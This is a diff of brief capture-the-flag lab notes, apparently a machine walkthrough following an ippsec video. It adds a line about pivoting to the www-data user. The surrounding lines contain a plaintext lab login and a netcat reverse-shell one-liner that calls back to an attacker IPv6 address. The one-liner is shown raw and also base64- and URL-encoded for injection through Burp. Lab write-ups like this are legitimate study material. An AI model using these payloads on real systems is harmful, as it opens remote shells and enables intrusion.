@@ -63,6 +63,8 @@ ssh in, ok
 check mysql, nothing interesting.
 find another http login cred, loki:lokipasswordmischieftrickery
 
+to sudo, we need shift to www-data user
+
 (rest are from ippsec video)
 generate: echo -n 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -6 dead:beef:2::xxxx 8888 >/tmp/f' | base64 -w 0
 in burp: echo+-n+'cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI%2bJjF8bmMgLTYgZGVhZDpiZWVmOjI6OjEwMTEgODg4OCA%2bL3RtcC9m'+|+base64+-d+|+sh%3
